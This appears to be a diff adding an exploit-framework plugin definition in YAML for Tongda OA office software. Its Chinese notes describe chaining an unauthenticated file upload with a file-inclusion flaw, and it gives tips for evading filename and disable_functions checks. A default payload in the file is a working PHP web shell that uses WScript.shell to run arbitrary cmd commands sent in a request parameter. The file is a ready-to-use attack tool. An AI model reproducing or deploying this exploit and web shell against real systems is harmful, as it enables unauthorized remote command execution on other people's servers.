@@ -1,0 +1,42 @@
+info:
+    app: 通达OA
+    name: upload_lfi
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2020-03-13"
+    create_date: "2024-10-06 09:06:51"
+    update_date: "2024-10-06 09:06:51"
+    scope: 2003版、2013增强版、2015版、2016版、2017版和V11版
+    description: |-
+        通达OA是一款协同办公自动化软件，该exp结合文件上传和文件包含两个漏洞进行利用，
+        在ispirit/im/upload.php中传入参数P则无需登录系统直接上传文件；
+        由于上传文件不再根目录，通过ispirit/interface/gateway.php中，不传入参数P则无需验证，可使用json参数进行文件包含执行。
+    detail: |-
+        文件名推荐使用如1.jpg,或者1.php.绕过。
+        文件内容由于通达MOA默认过滤了大部分执行命令的函数，所以可以使用COM组件绕过disable_function，这里提供默认模板。
+        上传成功后返回的链接可直接使用。
+
+        上传内容也可以为文件释放，释放文件默认在ispirit/interface路径下。
+        json里的general其实也可以替换成ispirit或module，根据源码这里只是做字符串匹配绕过使用。
+payloads:
+    - name: upload1
+      alias: 文件上传
+      params:
+          - key: filename
+            title: 文件名
+            param_type: edit
+            default_value: ""
+            required: true
+          - key: content
+            title: 内容
+            param_type: textarea
+            default_value: |-
+                <?php
+                $command=$_REQUEST['a'];
+                $wsh = new COM('WScript.shell');
+                $exec = $wsh->exec("cmd /c ".$command);
+                $stdout = $exec->StdOut();
+                $stroutput = $stdout->ReadAll();
+                echo $stroutput;
+                ?>
+            required: true
